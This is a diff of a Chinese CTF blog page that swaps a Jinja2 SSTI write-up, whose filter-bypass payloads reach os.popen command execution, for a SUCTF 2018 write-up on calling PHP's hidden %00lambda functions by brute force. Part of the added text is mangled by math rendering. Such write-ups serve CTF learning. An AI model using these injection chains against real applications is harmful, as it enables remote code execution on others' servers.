@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>安恒月赛SSTI的新姿势 | 过客</title>	
+<title>[SUCTF 2018]annonymous(php lambda) | 过客</title>	
 
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 <script type="text/javascript">
@@ -150,10 +150,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">安恒月赛SSTI的新姿势</h1>
+			<h1 class="wow swing entry-title">[SUCTF 2018]annonymous(php lambda)</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-02-27 15:06:51" itemprop="datePublished" pubdate="">2020-02-27</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-02-28 21:32:14" itemprop="datePublished" pubdate="">2020-02-28</time></i>
 	          </div>
 			
 </span>
@@ -161,56 +161,46 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>这题SSTI。过滤了点和下划线<br>
-writeup在此<code>https://www.gem-love.com/ctf/1799.html</code></p>
+				<p>题目给出了源码</p>
+<pre><code>&lt;?php
+
+$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);
+$hash = bin2hex(openssl_random_pseudo_bytes(32));
+eval(&quot;function SUCTF_$hash(){&quot;
+    .&quot;global \$MY;&quot;
+    .&quot;\$MY();&quot;
+    .&quot;}&quot;);
+if(isset($_GET['func_name'])){
+    $_GET[&quot;func_name&quot;]();
+    die();
+}
+show_source(__FILE__);
+</code></pre>
 <!-- more -->
-<p>膜拜dalao<br>
-首先用<code>attr()</code>来绕过点。<br>
-<code>|attr('__class__')==__class__</code><br>
-<img src="https://guokeya.github.io/post-images/1582787909200.png" alt="" loading="lazy"><br>
-那么问题又来了。这道题又过滤了下划线。<br>
-这里我们可以通过<code>request['arg']['a']</code>来获取传参中a的值</p>
-<pre><code>{{''|attr(request['args']['a'])}}&amp;a=__class__
-首先通过request['args']['a']获得传参中的值。
-''|attr(request['args']['a'])==''|attr('__class__')
-''|attr('__class__')==''.__class__
-</code></pre>
-<p><img src="https://guokeya.github.io/post-images/1582788173923.png" alt="" loading="lazy"><br>
-接下来就构造EXP了<br>
-常用的有<br>
-<code>&lt;class 'jinja2.runtime.Context'&gt;</code></p>
-<pre><code>().__class__.__base__.__subclasses__().__getitem__(233).__init__.__globals__.__getitem__.__builtins__.__getitem__.(eval)('__import__(&quot;os&quot;).popen('ls').read()')
-</code></pre>
-<p><code>&lt;class 'warnings.catch_warnings'&gt;</code></p>
-<pre><code>[].__class__.__base__.__subclasses__()[134].__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('ls').read()&quot;)
-</code></pre>
-<p><code>&lt;class 'codecs.StreamReaderWriter'&gt;</code>codecs下的模块都可以</p>
-<pre><code>().__class__.__base__.__subclasses__()[103].__init__.__globals__['sys'].modules[&quot;os&quot;].popen('whoami').read()
-</code></pre>
-<p>在取列表当中的值时。如果键值是字符就要用<code>__getitem__(request['args']['abc'])</code>来传参取值</p>
-<pre><code>x4=__getitem__
-x1=eval
-|attr(request['args']['x4'])[request['args']['x1']]=|attr(request['args']['x4'])['eval']
-|attr(request['args']['x4'])[request['args']['x1']]=__getitem__['eval']
-如果直接单纯的取数字类型。比如__subclasses__()[103]
-那么直接__getitem__(103)即可
-</code></pre>
-<p><code>{{()|attr(request['args']['x1'])|attr(request['args']['x2'])|attr(request['args']['x3'])()|attr(request['args']['x4'])(233)|attr(request['args']['x5'])|attr(request['args']['x6'])|attr(request['args']['x4'])(request['args']['x7'])|attr(request['args']['x4'])(request['args']['x8'])(request['args']['x9'])}}&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen('ls').read()</code></p>
+<p>首先创建了一个<code>$MY</code>的匿名函数。会输出flag<br>
+然后创建<code>$hash</code>会在eval函数中。与SUCTF拼接。形成一个新的函数名<br>
+要想拿到flag就只有调用SUCTF_XXXX随机数的函数名。或者直接调用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mi>Y</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">解</mi><mi>p</mi><mi>h</mi><mi>p</mi><mi mathvariant="normal">中</mi><mi>l</mi><mi>a</mi><mi>m</mi><mi>b</mi><mi>d</mi><mi>a</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi>l</mi><mi>a</mi><mi>m</mi><mi>b</mi><mi>d</mi><mi>a</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">创</mi><mi mathvariant="normal">建</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">匿</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">生</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">逐</mi><mi mathvariant="normal">步</mi><mi mathvariant="normal">递</mi><mi mathvariant="normal">增</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">遍</mi><mi mathvariant="normal">历</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">调</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">MY
+这里就要了解php中lambda函数
+lambda函数在创建一个匿名函数后。会生成一个函数名为``%00lambda_[0-999]``
+后面的数字会逐步递增。
+我们可以通过遍历数字。来调用``</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">解</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mord cjk_fallback">中</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">创</span><span class="mord cjk_fallback">建</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">匿</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">为</span><span class="mord">‘</span><span class="mord">‘</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">逐</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">递</span><span class="mord cjk_fallback">增</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">遍</span><span class="mord cjk_fallback">历</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord">‘</span><span class="mord">‘</span></span></span></span>MY``的匿名函数<br>
+burp跑下就行<br>
+<img src="https://guokeya.github.io/post-images/1582897129399.png" alt="" loading="lazy"></p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
 				<a href="https://guokeya.github.io/tag/CTF/" rel="tag">CTF</a>	
 				 
+				<a href="https://guokeya.github.io/tag/Web/" rel="tag">Web安全</a>	
+				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/mcUK57hAJ/" rel="prev"> [SUCTF 2018]annonymous(php lambda)</a></div>
 		 
-		 
-		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/i-chun-qiu-gong-yi-sai-day2-de-liang-ti-web/" rel="next"> I春秋公益赛部分Writeup</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/m9L1ZJk4j/" rel="next"> 安恒月赛SSTI的新姿势</a></div>
 		
 		</div>
 	</nav>
